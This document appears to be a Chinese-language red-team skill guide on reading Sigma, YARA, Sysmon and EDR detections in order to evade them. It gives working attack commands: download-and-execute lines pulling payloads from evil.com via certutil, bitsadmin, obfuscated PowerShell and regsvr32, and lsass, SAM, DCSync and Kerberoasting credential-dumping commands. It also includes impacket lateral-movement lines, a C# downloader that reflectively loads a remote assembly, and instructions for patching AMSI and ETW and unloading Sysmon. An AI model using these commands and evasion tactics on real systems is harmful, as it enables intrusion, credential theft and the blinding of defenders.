# Sigma/YARA 检测规则分析与绕过

> 红队的核心原则：**你必须比蓝队更了解他们的检测规则**。研究公开的 Sigma/YARA 规则库，确保你的每一步操作都不命中已知检测逻辑。

---

## 1. Sigma 规则结构与解读

### 1.1 Sigma 规则基础结构

Sigma 是一种平台无关的检测规则格式，可以转换为 Splunk/Elastic/QRadar 等 SIEM 查询。理解 Sigma 规则就是理解蓝队在搜索什么。

```yaml
# Sigma 规则标准结构
title: Suspicious PowerShell Download Cradle
id: 6e897651-f157-4d91-af3d-9f0f5a4b4b11
status: stable
description: Detects suspicious PowerShell download patterns
references:
    - https://attack.mitre.org/techniques/T1059/001/
author: Sigma Community
date: 2023/01/15
tags:
    - attack.execution
    - attack.t1059.001
    - attack.t1105
logsource:                          # 数据来源定义
    category: process_creation      # 日志类别
    product: windows                # 操作系统
detection:                          # 核心检测逻辑
    selection_cmd:                  # 选择条件1
        CommandLine|contains:
            - 'IEX'
            - 'Invoke-Expression'
    selection_download:             # 选择条件2
        CommandLine|contains:
            - 'Net.WebClient'
            - 'DownloadString'
            - 'DownloadFile'
            - 'Invoke-WebRequest'
    condition: selection_cmd and selection_download   # 组合条件
level: high
falsepositives:
    - Legitimate admin scripts      # 误报说明
```

### 1.2 Sigma 检测逻辑解读要点

```
检测逻辑解析技巧：
├─ condition 字段是核心 → 决定了哪些 selection 如何组合
│   ├─ "A and B" → 两个条件都满足才告警
│   ├─ "A or B" → 任一条件满足就告警
│   ├─ "A and not B" → 满足 A 但排除 B（有白名单）
│   └─ "selection | count() >= 3" → 需累计达到阈值
│
├─ logsource 字段 → 告诉你蓝队依赖什么数据源
│   ├─ category: process_creation → Sysmon Event 1 / Security 4688
│   ├─ category: image_load → Sysmon Event 7
│   ├─ category: network_connection → Sysmon Event 3
│   ├─ category: file_event → Sysmon Event 11
│   └─ product: windows + service: powershell → PowerShell ScriptBlock (4104)
│
├─ |contains / |endswith / |startswith → 匹配修饰符
│   ├─ |contains → 包含任意位置匹配（最常见）
│   ├─ |endswith → 路径/文件名末尾匹配
│   ├─ |startswith → 开头匹配
│   ├─ |re → 正则表达式（少见但更强）
│   └─ |all → 列表中所有值都必须匹配
│
└─ falsepositives 字段 → 可利用的白名单/盲区
    └─ 如果写了 "Legitimate admin scripts" → 伪装成管理脚本可能绕过
```

### 1.3 快速分析 Sigma 规则的方法

```bash
# 克隆 Sigma 官方规则库
git clone https://github.com/SigmaHQ/sigma.git
cd sigma/rules/windows

# 搜索与你的 TTP 相关的规则
grep -rl "powershell" --include="*.yml" .
grep -rl "lsass" --include="*.yml" .
grep -rl "mimikatz" --include="*.yml" .
grep -rl "scheduled_task" --include="*.yml" .

# 查看特定规则的检测条件
cat process_creation/proc_creation_win_powershell_download.yml

# 使用 sigmac 转换为具体 SIEM 查询（了解蓝队实际看到的查询）
# Splunk 格式
sigma convert -t splunk -p sysmon rules/windows/process_creation/proc_creation_win_powershell_download.yml

# Elastic 格式
sigma convert -t elasticsearch rules/windows/process_creation/proc_creation_win_powershell_download.yml
```

---

## 2. 企业 SIEM 常见 Sigma 规则 Top 20 与绕过

### 规则 1: Suspicious PowerShell Download

```yaml
# 检测逻辑
detection:
  selection:
    CommandLine|contains:
      - 'IEX'
      - 'Invoke-Expression'
      - 'DownloadString'
      - 'Net.WebClient'
      - 'Invoke-WebRequest'
      - 'wget'
      - 'curl'
```

```
绕过方法：
├─ 方法1: 不使用 PowerShell 下载
│   使用 certutil / bitsadmin / MpCmdRun.exe 等 LOLBins
│   > certutil -urlcache -split -f http://evil.com/payload.exe C:\temp\legit.exe
│   > bitsadmin /transfer job /download /priority high http://evil.com/p.exe C:\temp\p.exe
│
├─ 方法2: 使用 .NET 方法代替 PS cmdlet（绕过 ScriptBlock 日志）
│   > [System.Net.ServicePointManager]::SecurityProtocol=[System.Net.SecurityProtocolType]::Tls12
│   > $c=New-Object System.Net.Sockets.TcpClient("host",443)
│
├─ 方法3: PowerShell 字符串混淆
│   > $a='IEX';$b='(New-Object Net.We';$c='bClient).Downlo';$d='adString';
│   > &($a) "$b$c$d('http://evil.com/p.ps1')"
│
└─ 方法4: 使用 PowerShell runspace 执行（不产生新进程）
    通过 C# 加载 PowerShell runspace → 父进程为你的 loader
```

### 规则 2: LSASS Memory Access

```yaml
# 检测逻辑（Sysmon Event 10）
detection:
  selection:
    EventID: 10
    TargetImage|endswith: '\lsass.exe'
    GrantedAccess|contains:
      - '0x1010'    # PROCESS_QUERY_LIMITED_INFORMATION + PROCESS_VM_READ
      - '0x1410'    # + PROCESS_QUERY_INFORMATION
      - '0x1FFFFF'  # PROCESS_ALL_ACCESS
      - '0x1038'
  filter:
    SourceImage|endswith:
      - '\wmiprvse.exe'
      - '\taskmgr.exe'
      - '\procexp64.exe'
```

```
绕过方法：
├─ 方法1: Handle Duplication（不直接 OpenProcess lsass）
│   ├─ 打开一个已有 lsass handle 的进程
│   ├─ 使用 NtDuplicateObject 复制其 handle
│   └─ GrantedAccess 不同，绕过规则中的特定值
│
├─ 方法2: 使用 PPL（Protected Process Light）绕过
│   ├─ 加载签名驱动 → 从内核态读取 lsass 内存
│   └─ 工具: PPLdump, mimidrv.sys
│
├─ 方法3: MiniDumpWriteDump 替代方案
│   ├─ NanoDump: 使用 syscall 直接调用，不走 ntdll
│   ├─ 自定义 dump: 读取 lsass 进程内存中的特定结构
│   └─ comsvcs.dll 方式: rundll32 comsvcs.dll MiniDump <lsass_pid> dump.bin full
│
├─ 方法4: 利用白名单进程
│   ├─ 通过 WerFault.exe 触发 lsass dump
│   ├─ 通过 procdump.exe（SysInternals 签名工具）
│   └─ SourceImage 在白名单中 → 不告警
│
└─ 方法5: 不 dump lsass（替代凭据获取途径）
    ├─ SAM 数据库: reg save HKLM\SAM sam.bak
    ├─ DCSync: 使用 Mimikatz DCSync 直接从 DC 获取
    ├─ Kerberoasting: 不需要 lsass
    └─ NTDS.dit: 如果已有 DC 权限
```

### 规则 3: Suspicious Parent-Child Process Relationship

```yaml
# 检测逻辑
detection:
  selection:
    ParentImage|endswith:
      - '\outlook.exe'
      - '\excel.exe'
      - '\winword.exe'
      - '\powerpnt.exe'
    Image|endswith:
      - '\cmd.exe'
      - '\powershell.exe'
      - '\mshta.exe'
      - '\wscript.exe'
      - '\cscript.exe'
      - '\certutil.exe'
```

```
绕过方法：
├─ 方法1: 通过 COM 对象断开进程链
│   VBA → Shell.Application → COM → svchost.exe → 你的进程
│   父进程变为 svchost.exe 而非 Office 进程
│
├─ 方法2: WMI 间接执行
│   VBA → WMI Win32_Process.Create → wmiprvse.exe → 你的进程
│   父进程变为 wmiprvse.exe
│
├─ 方法3: 计划任务
│   VBA → schtasks /create → taskeng.exe/taskhostw.exe → 你的进程
│   父进程变为 taskhostw.exe
│
├─ 方法4: 使用 DDE 而非 VBA 宏
│   不执行 VBA → 不触发 Office 启动 cmd/powershell
│
└─ 方法5: 注入已有合法进程
    VBA → Early Bird APC 注入到 explorer.exe
    不创建新进程 → 完全绕过父子关系检测
```

### 规则 4: Reconnaissance Command Burst

```yaml
# 检测逻辑
detection:
  selection:
    CommandLine|contains:
      - 'whoami'
      - 'net user'
      - 'net group'
      - 'ipconfig'
      - 'systeminfo'
      - 'nltest'
      - 'net localgroup'
      - 'tasklist'
  timeframe: 5m
  condition: selection | count() >= 3
```

```
绕过方法：
├─ 方法1: 时间分散
│   每个命令间隔 10+ 分钟 → 不触发 5m 内 3 次的阈值
│   在 Beacon sleep 之间穿插单个侦察命令
│
├─ 方法2: 使用替代方法获取同等信息
│   whoami → [Environment]::UserName / token 查询
│   net user → LDAP 查询 / PowerView Get-DomainUser
│   ipconfig → [System.Net.Dns]::GetHostAddresses("")
│   systeminfo → WMI Win32_OperatingSystem
│   tasklist → WMI Win32_Process
│
├─ 方法3: 单命令获取全部信息
│   一次 LDAP 查询获取所有需要的域信息
│   一次 WMI 查询获取所有主机信息
│   只产生 1 个进程事件而非 5+
│
└─ 方法4: 通过 BOF（Beacon Object File）执行
    BOF 在 Beacon 进程内执行，不创建新进程
    不产生 process_creation 事件 → Sysmon Event 1 无记录
```

### 规则 5: Credential Dumping via Registry

```yaml
detection:
  selection:
    CommandLine|contains:
      - 'reg save'
      - 'reg export'
    CommandLine|contains:
      - 'HKLM\SAM'
      - 'HKLM\SYSTEM'
      - 'HKLM\SECURITY'
```

```
绕过方法：
├─ 方法1: 使用 esentutl 复制注册表 hive 文件
│   > esentutl.exe /y /vss C:\Windows\System32\config\SAM /d C:\temp\sam
│
├─ 方法2: Volume Shadow Copy
│   > wmic shadowcopy call create Volume='C:\'
│   > copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\temp\sam
│
├─ 方法3: 直接读取磁盘（绕过文件系统 API）
│   使用 NtfsLib 直接读取 NTFS 扇区
│   不产生文件操作日志
│
└─ 方法4: DCSync（如果目标是域凭据）
    不接触注册表 → 通过 DRSUAPI 协议从 DC 复制
```

### 规则 6: PsExec Usage

```yaml
detection:
  selection_service:
    EventID: 7045      # Service Installation
    ServiceName: 'PSEXESVC'
  selection_pipe:
    PipeName|contains: '\PSEXESVC'
```

```
绕过方法：
├─ 方法1: 修改 PsExec 服务名
│   impacket-psexec 支持自定义服务名:
│   > impacket-psexec -service-name "WinMgmtSvc" DOMAIN/user:pass@target
│
├─ 方法2: 使用 SMBExec（不写入服务）
│   > impacket-smbexec DOMAIN/user:pass@target
│
├─ 方法3: 使用 WMI 执行
│   > impacket-wmiexec DOMAIN/user:pass@target
│
├─ 方法4: 使用 WinRM
│   > evil-winrm -i target -u user -p 'pass'
│
└─ 方法5: 使用 DCOM 执行
    > impacket-dcomexec DOMAIN/user:pass@target
```

### 规则 7: Mimikatz Command Line Arguments

```yaml
detection:
  selection:
    CommandLine|contains:
      - 'sekurlsa'
      - 'kerberos::list'
      - 'lsadump'
      - 'privilege::debug'
      - 'token::elevate'
      - 'crypto::certificates'
```

```
绕过方法：
├─ 方法1: 在内存中执行（不产生命令行）
│   Invoke-Mimikatz 在 PowerShell 内存中 → 不创建新进程
│   但注意 ScriptBlock Logging 仍会记录
│
├─ 方法2: 使用 Cobalt Strike 的 logonpasswords/dcsync
│   通过 BOF 执行 → 不产生命令行参数
│
├─ 方法3: 使用替代工具
│   pypykatz → Python 实现，在攻击机解析 dump 文件
│   NanoDump → 直接 dump lsass 无需 mimikatz
│   Rubeus → C# 实现 Kerberos 攻击
│
└─ 方法4: 如果必须使用命令行
    混淆: mimi"kat"z privilege::debug → 字符串断开
    但现代 EDR 通常能处理简单混淆
```

### 规则 8: Scheduled Task Creation

```yaml
detection:
  selection_cli:
    CommandLine|contains:
      - 'schtasks'
      - '/create'
  selection_event:
    EventID: 4698   # Scheduled Task Created
```

```
绕过方法：
├─ 方法1: 使用 COM 对象创建计划任务（不产生 schtasks 命令行）
│   通过 ITaskService COM 接口 → 不触发命令行检测
│   但仍产生 EventID 4698
│
├─ 方法2: 修改已有计划任务（不创建新任务）
│   > schtasks /change /tn "ExistingTask" /tr "new_command"
│   不触发 4698 → 触发 4702（Task Updated）
│   许多 Sigma 规则不监控 4702
│
├─ 方法3: 直接操作注册表
│   计划任务存储在:
│   HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache
│   直接写注册表 → 可能不触发 4698
│
└─ 方法4: 使用替代持久化
    Registry Run Keys → 更简单但也有对应规则
    WMI Event Subscription → 检测较少
    DLL 劫持 → 无新对象创建
```

### 规则 9: Suspicious Service Installation

```yaml
detection:
  selection:
    EventID: 7045
    ServiceFileName|contains:
      - 'cmd.exe'
      - 'powershell'
      - '/c '
      - 'COMSPEC'
      - '.bat'
      - '.ps1'
```

```
绕过方法：
├─ 方法1: 使用合法 EXE 路径作为服务二进制
│   注册服务指向: C:\Windows\System32\svchost.exe -k netsvcs
│   通过 DLL 劫持让 svchost 加载恶意 DLL
│
├─ 方法2: 服务二进制为编译好的 EXE（不含可疑命令行）
│   自定义 Service EXE → 无 cmd/powershell 参数
│
└─ 方法3: 使用现有合法服务
    修改已有服务的 ImagePath（binpath）
    不创建新服务 → 不触发 7045
```

### 规则 10: Remote Thread Injection

```yaml
detection:
  selection:
    EventID: 8            # CreateRemoteThread
    SourceImage|endswith:
      - '\powershell.exe'
      - '\cmd.exe'
      - '\rundll32.exe'
  filter:
    TargetImage|endswith: '\svchost.exe'
```

```
绕过方法：
├─ 方法1: 使用 APC 注入代替 CreateRemoteThread
│   QueueUserAPC → 不产生 Sysmon Event 8
│
├─ 方法2: Process Hollowing
│   创建合法进程（suspended）→ 替换内存 → 恢复执行
│   不使用 CreateRemoteThread
│
├─ 方法3: 使用合法 SourceImage
│   从 explorer.exe / services.exe 上下文注入
│   SourceImage 在白名单中
│
├─ 方法4: Early Bird 注入
│   在进程初始化前注入 → APC 在 main thread 启动前执行
│
└─ 方法5: Module Stomping
    覆盖已加载 DLL 的 .text 段 → 不分配新内存
    不触发 RWX 内存分配检测
```

### 规则 11-20 速查表

| # | 规则名称 | 检测关键字 | 绕过思路 |
|---|---------|-----------|---------|
| 11 | Cobalt Strike Pipe Name | `\MSSE-`, `\postex_`, `\msagent_` | 自定义 named pipe 前缀 |
| 12 | DCSync Attack | EventID 4662 + GUID `{1131f6ad-}` | 使用已有 DC 管理员 session |
| 13 | WMI Remote Execution | `process call create` + EventID 1 | 使用 DCOM/WinRM 替代 |
| 14 | PowerShell Base64 Encoded | `-enc` + Base64 pattern | 使用 AMSI bypass + 明文脚本 |
| 15 | Suspicious Network Connection | 进程首次外连 + 非常见端口 | 使用 443/80 + 合法域名 |
| 16 | DLL Side-Loading | DLL 不在预期路径 | 使用已知合法 Side-Loading 组合 |
| 17 | RDP Lateral Movement | EventID 4624 Type 10 | 使用 SharpRDP/WMI 替代 |
| 18 | Pass-the-Hash | EventID 4624 Type 3 + NTLM | 使用 Kerberos (Overpass-the-Hash) |
| 19 | Suspicious DNS Query | 长域名/高频/TXT 记录 | 低频 + 短子域名 + A 记录 |
| 20 | File Created in Temp with Execution | `\Temp\*.exe` creation + execution | 使用非 Temp 目录 / DLL 而非 EXE |

---

## 3. YARA 规则结构与规避

### 3.1 YARA 规则基础

```yara
// YARA 规则结构示例
rule CobaltStrike_Beacon_Generic {
    meta:
        description = "Detects Cobalt Strike Beacon"
        author = "Florian Roth"
        date = "2023-01-01"
        score = 80

    strings:
        // 字符串匹配
        $s1 = "beacon.dll" ascii wide
        $s2 = "ReflectiveLoader" ascii
        $s3 = "%s.4%08x%08x%08x%08x%08x.%08x%08x%08x%08x%08x%08x%08x.%08x%08x%08x%08x%08x%08x%08x.%08x%08x%08x%08x%08x%08x%08x.%x%x.%s" ascii

        // Hex 模式匹配
        $h1 = { 4D 5A 90 00 03 00 00 00 04 00 00 00 FF FF 00 00 }  // MZ header
        $h2 = { 48 8B 05 ?? ?? ?? ?? 48 85 C0 74 ?? }              // x64 code pattern

        // 正则匹配
        $r1 = /https?:\/\/[a-zA-Z0-9\-\.]+\/[a-zA-Z]{4}/ ascii

    condition:
        uint16(0) == 0x5A4D and         // PE 文件
        filesize < 500KB and            // 文件大小限制
        (2 of ($s*) or any of ($h*))    // 字符串组合条件
}
```

### 3.2 YARA 规避技术

```
YARA 规则分析与规避流程：

1. 扫描你的 Payload 确认命中哪些规则
   $ yara -r /path/to/rules/ payload.exe
   $ yara -s -r /path/to/rules/ payload.exe    # 显示匹配的字符串

2. 针对每个命中的规则分析突破点

字符串规避（$s 类型）：
├─ ASCII/Wide 字符串 → XOR 加密 + 运行时解密
│   "beacon.dll" → XOR 0x41 → 存储密文，运行时 XOR 回来
├─ API 名称字符串 → 动态 API 解析（GetProcAddress hash）
│   不在二进制中硬编码 API 名 → YARA 无法匹配
├─ URL/路径 → 运行时拼接或从配置解密
└─ 宽字符（wide）→ 使用 UTF-8 或自定义编码代替 UTF-16

Hex 模式规避（$h 类型）：
├─ 函数序言 → 改变编译器/编译选项
│   -O0 vs -O2 vs -Os 产生不同的机器码
├─ 代码模式 → 插入 junk instructions（NOP sled 变体）
├─ 结构体布局 → 改变字段顺序/对齐方式
└─ 通配符 (??) → 如果规则有 wildcard，需要改变整段代码结构

条件规避：
├─ filesize 限制 → Padding 使文件大小超出范围
│   rule 要求 filesize < 500KB → 填充到 600KB
├─ PE header 检查 → 使用非 PE 格式（shellcode / DLL sideloading）
├─ "N of ($s*)" → 只需消除足够多的字符串使计数低于阈值
│   如 condition: 3 of ($s*) → 消除到只有 2 个匹配
└─ uint16(0) == 0x5A4D → 使用 shellcode 格式（无 PE header）
```

### 3.3 实用 YARA 规避脚本

```python
#!/usr/bin/env python3
"""
yara_check.py - 批量扫描 payload 并报告命中规则
用于红队在投递前自测 payload
"""

import yara
import sys
import os
import json

def compile_rules(rules_dir):
    """编译指定目录下的所有 YARA 规则"""
    rule_files = {}
    for root, dirs, files in os.walk(rules_dir):
        for f in files:
            if f.endswith(('.yar', '.yara')):
                path = os.path.join(root, f)
                rule_files[f] = path
    return yara.compile(filepaths=rule_files)

def scan_file(rules, filepath):
    """扫描文件并返回命中结果"""
    matches = rules.match(filepath)
    results = []
    for match in matches:
        result = {
            "rule": match.rule,
            "tags": match.tags,
            "strings": []
        }
        for offset, identifier, data in match.strings:
            result["strings"].append({
                "offset": hex(offset),
                "identifier": identifier,
                "data": data[:50].hex()  # 只显示前 50 字节
            })
        results.append(result)
    return results

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <rules_dir> <payload_file>")
        sys.exit(1)

    rules = compile_rules(sys.argv[1])
    results = scan_file(rules, sys.argv[2])

    if results:
        print(f"[!] {len(results)} rules matched:")
        for r in results:
            print(f"  Rule: {r['rule']}")
            print(f"  Tags: {r['tags']}")
            for s in r["strings"]:
                print(f"    {s['identifier']} @ {s['offset']}: {s['data']}")
    else:
        print("[+] No rules matched - payload is clean")
```

---

## 4. EDR 行为检测模式与绕过

### 4.1 EDR 检测层次模型

```
现代 EDR 检测架构（从浅到深）：

Layer 1: 静态签名
├─ 文件哈希（SHA256）→ 已知恶意文件直接拦截
├─ YARA 规则 → 字节模式匹配
└─ 导入表分析 → 可疑 API 组合

Layer 2: 行为规则
├─ 进程链分析 → 异常父子关系
├─ API 调用序列 → VirtualAlloc → WriteProcessMemory → CreateRemoteThread = 注入
├─ 文件操作 → 写入+执行+删除 = dropper 模式
└─ 网络行为 → 进程首次外连 + 非常见目的地

Layer 3: 机器学习
├─ 特征向量 → PE 结构/字符串熵值/节区权限/导入函数
├─ 行为序列 → LSTM/Transformer 模型分析时序操作
└─ 异常检测 → 偏离基线的操作模式

Layer 4: 内存扫描
├─ 周期性扫描进程内存 → 检测内存中的 shellcode/解密后 payload
├─ RWX 页面检测 → 可执行+可写内存 = 可疑
├─ Unbacked 内存执行 → 不属于任何 DLL 的可执行内存
└─ ETW（Event Tracing for Windows）→ 内核级别遥测
```

### 4.2 主流 EDR 检测重点与绕过策略

```
CrowdStrike Falcon:
├─ 强项: 内核级驱动 + 云端分析 + 行为链
├─ 检测重点: 进程注入、凭据访问、横向移动
├─ 绕过思路:
│   ├─ 使用 Direct Syscalls（绕过 ntdll hook）
│   ├─ 避免 CreateRemoteThread（使用 APC/callback）
│   └─ 通过 LOLBins 执行（避免异常进程链）

Microsoft Defender for Endpoint:
├─ 强项: AMSI 集成 + ETW 遥测 + 云端 AI
├─ 检测重点: PowerShell/脚本执行、AMSI 绕过尝试
├─ 绕过思路:
│   ├─ AMSI bypass（patch AmsiScanBuffer）
│   ├─ ETW patching（patch EtwEventWrite）
│   └─ 使用编译型语言（避免脚本引擎）

SentinelOne:
├─ 强项: 自主 AI 引擎 + 无签名检测 + 回滚能力
├─ 检测重点: 机器学习模型 + 行为引擎
├─ 绕过思路:
│   ├─ Payload 结构去特征化（降低熵值、添加合法资源）
│   ├─ 延迟执行（绕过沙箱超时）
│   └─ 分离 shellcode 和 loader（loader 本身无恶意特征）
```

### 4.3 通用 EDR 绕过策略

```
策略1: Direct Syscalls（绕过用户态 hook）
├─ EDR 通常 hook ntdll.dll 中的函数
├─ 直接使用 syscall 指令跳过 hook
├─ 工具: SysWhispers3, HellsGate, HalosGate
└─ 注意: 部分 EDR 监控 syscall 来源（非 ntdll 地址 = 可疑）

策略2: 间接 Syscalls
├─ 从 ntdll 中查找 syscall;ret 地址
├─ 跳转到该地址执行 syscall
├─ 调用栈看起来来自 ntdll → 绕过栈回溯检测

策略3: 回调函数执行（替代 CreateThread）
├─ EnumWindows callback
├─ CertEnumSystemStore callback
├─ SetTimer callback
├─ EnumDesktops callback
└─ 不创建新线程 → 不触发线程创建检测

策略4: 合法签名进程代理执行
├─ DLL Side-Loading: 利用合法签名 EXE 加载恶意 DLL
├─ Module Stomping: 覆盖已加载的合法 DLL
├─ Phantom DLL Hollowing: 映射删除的 DLL → 代码执行
└─ Transacted Hollowing: 使用 NTFS Transaction
```

---

## 5. Sysmon 配置分析（发现盲区）

### 5.1 Sysmon 事件类型与红队关注点

```
Sysmon 事件 ID 与红队影响：

Event 1  - Process Creation     → 进程创建（最常用的检测源）
Event 2  - File Creation Time   → 时间戳修改
Event 3  - Network Connection   → 网络连接（C2 检测）
Event 5  - Process Termination  → 进程终止
Event 6  - Driver Loaded        → 驱动加载
Event 7  - Image Loaded         → DLL 加载
Event 8  - CreateRemoteThread   → 远程线程注入
Event 9  - RawAccessRead        → 磁盘原始读取
Event 10 - ProcessAccess        → 进程访问（lsass 检测）
Event 11 - FileCreate           → 文件创建
Event 12 - Registry Create/Del  → 注册表创建/删除
Event 13 - Registry Value Set   → 注册表值修改
Event 14 - Registry Rename      → 注册表重命名
Event 15 - FileCreateStreamHash → ADS 创建
Event 17 - PipeCreated          → 命名管道创建
Event 18 - PipeConnected        → 命名管道连接
Event 22 - DNSQuery             → DNS 查询
Event 23 - FileDelete           → 文件删除
Event 25 - ProcessTampering     → 进程篡改检测
Event 26 - FileDeleteDetected   → 文件删除检测
Event 28 - FileBlockShredding   → 文件粉碎阻止
```

### 5.2 分析目标 Sysmon 配置

```powershell
# 检查 Sysmon 是否安装
Get-Service sysmon*
Get-Process sysmon*

# 获取 Sysmon 配置（需要管理员权限）
# 方法1: 导出当前配置
sysmon -c

# 方法2: 查看注册表中的配置 hash
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SysmonDrv\Parameters"

# 方法3: 从 Sysmon 驱动内存中提取配置
# 使用 SysmonConfigExtractor 工具
```

### 5.3 常见 Sysmon 配置盲区

```
大多数企业使用 SwiftOnSecurity 或 DVMS 的 Sysmon 配置模板。
这些模板有已知的盲区：

盲区 1: 未监控的进程
├─ 默认排除: MsMpEng.exe, chrome.exe, firefox.exe, svchost.exe 的部分事件
├─ 利用: 通过 DLL 注入到 chrome.exe → 网络连接不被记录
└─ 验证: 检查配置中的 <ProcessCreate onmatch="exclude"> 段

盲区 2: 未监控的路径
├─ 默认排除: C:\Windows\Temp\ 下的某些操作
├─ 默认排除: C:\ProgramData\ 下的部分文件操作
└─ 利用: 在排除路径下操作

盲区 3: 未监控的事件类型
├─ 许多配置不启用 Event 9 (RawAccessRead)
├─ 许多配置不启用 Event 15 (FileCreateStreamHash/ADS)
├─ Event 22 (DNS Query) 在旧版本配置中常缺失
└─ 利用: 使用原始磁盘读取代替文件 API

盲区 4: 网络连接白名单
├─ 到 Microsoft/Google/Amazon IP 的连接常被排除
├─ 443 端口连接可能被排除（太多合法 HTTPS 流量）
└─ 利用: C2 使用 Cloud Provider IP + 443 端口
```

### 5.4 Sysmon 绕过技术

```
技术1: 修改 Sysmon 配置（需 SYSTEM 权限）
├─ fltMC unload SysmonDrv → 卸载 Sysmon 驱动
├─ ⛔ 高风险: 会产生 Sysmon 停止事件，立即被发现
└─ 仅在确认无人值守监控时使用

技术2: 利用配置排除规则
├─ 确认目标 Sysmon 排除了哪些进程/路径
├─ 在排除范围内操作
└─ 低风险: 不修改 Sysmon 本身

技术3: Event Tracing Patching
├─ Patch NtTraceEvent → 阻止事件上报
├─ 仅影响特定进程的事件
└─ 中风险: 可能被 EDR 检测到 patch 行为

技术4: Minifilter Altitude 竞争
├─ 注册一个更高 altitude 的 minifilter
├─ 在 Sysmon 之前拦截/修改事件
└─ 高复杂度: 需要内核驱动
```

---

## 6. 实战绕过案例

### 案例 1: 绕过 "Suspicious PowerShell" 检测规则

**目标**: 在启用 PowerShell ScriptBlock Logging (EventID 4104) + Sysmon 进程监控的环境中下载并执行 Payload。

```
检测规则覆盖:
├─ Sigma: Suspicious PowerShell Download Cradle (Event 4104)
├─ Sigma: Suspicious PowerShell Encoded Command (Event 1)
├─ Sysmon: Process Creation with powershell.exe (Event 1)
├─ Sysmon: Network Connection from powershell.exe (Event 3)
└─ EDR: PowerShell 进程行为链

绕过策略: 完全避免使用 PowerShell
```

```csharp
// 方法: 使用 C# 编译的 EXE，通过 .NET API 下载并反射加载
// 不产生 powershell.exe 进程
// 不触发 ScriptBlock Logging
// 不触发 "PowerShell" 相关 Sigma 规则

using System;
using System.Net;
using System.Reflection;

namespace Loader
{
    class Program
    {
        static void Main(string[] args)
        {
            // 使用 WebClient 下载（与 PowerShell 的 Net.WebClient 是同一个类）
            // 但因为不在 PowerShell 上下文中，不触发 PS 相关检测
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;

            WebClient wc = new WebClient();
            // 伪装 User-Agent
            wc.Headers.Add("User-Agent",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");

            byte[] data = wc.DownloadData("https://cdn-assets.example.com/api/v1/config");

            // 反射加载 .NET assembly
            Assembly asm = Assembly.Load(data);
            asm.EntryPoint.Invoke(null, new object[] { new string[] { } });
        }
    }
}
```

```
更隐蔽的替代方案：

方案A: 通过 msbuild.exe 执行（LOLBin，微软签名）
├─ 编写 .csproj 文件包含内联 C# 代码
├─ > C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe payload.csproj
├─ 进程为 MSBuild.exe → 微软签名进程
└─ 许多 Sysmon 配置排除 MSBuild

方案B: 通过 InstallUtil.exe 执行
├─ 编译包含 [System.ComponentModel.RunInstaller(true)] 的 DLL
├─ > C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U payload.dll
└─ 进程为 InstallUtil.exe

方案C: 通过 Regsvr32 执行
├─ > regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll
└─ 进程为 regsvr32.exe（但已有专门 Sigma 规则）
```

### 案例 2: 绕过 "LSASS Access" 检测规则

**目标**: 在启用 Credential Guard + Sysmon Event 10 监控 + EDR 的环境中获取域凭据。

```
检测规则覆盖:
├─ Sigma: LSASS Memory Access (Sysmon Event 10)
├─ Sigma: Credential Dumping Tool Detected
├─ EDR: ProcessAccess to lsass.exe
├─ Windows Credential Guard: 阻止直接内存读取
└─ PPL (Protected Process Light): lsass 运行在保护模式

绕过策略: 根据保护级别选择方案
```

```
环境评估:
├─ 检查 Credential Guard: Get-ComputerInfo | Select DeviceGuard*
├─ 检查 LSA Protection: reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL
└─ 检查 Sysmon Event 10 配置: sysmon -c | findstr ProcessAccess

方案选择矩阵:
┌────────────────────────────┬───────────────────────────┐
│ 环境条件                    │ 推荐方案                   │
├────────────────────────────┼───────────────────────────┤
│ 无 CG + 无 PPL + 无 Sysmon │ 直接 Mimikatz            │
│ 有 Sysmon Event 10         │ Handle Duplication        │
│ 有 PPL                     │ 驱动绕过 / 替代方案       │
│ 有 Credential Guard        │ 完全放弃 lsass → 其他途径 │
└────────────────────────────┴───────────────────────────┘
```

```
Credential Guard 环境的替代凭据获取:

方案1: DCSync（需要域管理员权限或 Replication 权限）
├─ 不接触 lsass
├─ 通过 DRSUAPI 协议从 DC 直接复制 NTDS 数据
├─ > mimikatz "lsadump::dcsync /domain:corp.local /user:krbtgt"
└─ 检测: EventID 4662 + 特定 GUID → 需要从已有管理员 session 执行

方案2: Kerberoasting（需要任意域用户）
├─ 不接触 lsass
├─ 请求 SPN 对应的 TGS 票据 → 离线破解
├─ > Rubeus.exe kerberoast /outfile:tickets.txt
└─ 检测: EventID 4769 Type 0x17 → 大量 RC4 票据请求

方案3: NTDS.dit 提取（需要 DC 访问权限）
├─ Volume Shadow Copy → 复制 NTDS.dit 和 SYSTEM hive
├─ 离线使用 impacket-secretsdump 解析
└─ 检测: EventID 4688 + vssadmin/wmic shadowcopy

方案4: 其他明文凭据位置
├─ DPAPI: 浏览器/RDP/WiFi 保存的密码
├─ GPP: Group Policy Preferences 中的密码（老域环境）
├─ Vault: Windows Credential Manager
├─ Azure AD: 如有混合部署，Token/PRT
└─ 服务账户: web.config / 连接字符串 / 环境变量
```

---

## 7. 检测规则研究资源

| 资源 | 地址 | 用途 |
|------|------|------|
| Sigma 规则仓库 | github.com/SigmaHQ/sigma | 最全面的 Sigma 规则集 |
| YARA 规则仓库 | github.com/Yara-Rules/rules | 社区 YARA 规则集 |
| Elastic Detection Rules | github.com/elastic/detection-rules | Elastic SIEM 检测规则 |
| Splunk Security Content | github.com/splunk/security_content | Splunk 检测规则 |
| Azure Sentinel | github.com/Azure/Azure-Sentinel | 微软 Sentinel 检测规则 |
| LOLBAS | lolbas-project.github.io | LOLBin 列表和用法 |
| Atomic Red Team | github.com/redcanaryco/atomic-red-team | TTP 原子测试 |
| SwiftOnSecurity Sysmon | github.com/SwiftOnSecurity/sysmon-config | 最流行的 Sysmon 配置 |
| Unprotect Project | unprotect.it | 恶意软件规避技术百科 |

---

## 关联参考

- **威胁猎杀原理与规避** → `../SKILL.md`
- **C2 免杀方法论** → `/skills/evasion/c2-evasion-methodology/SKILL.md`
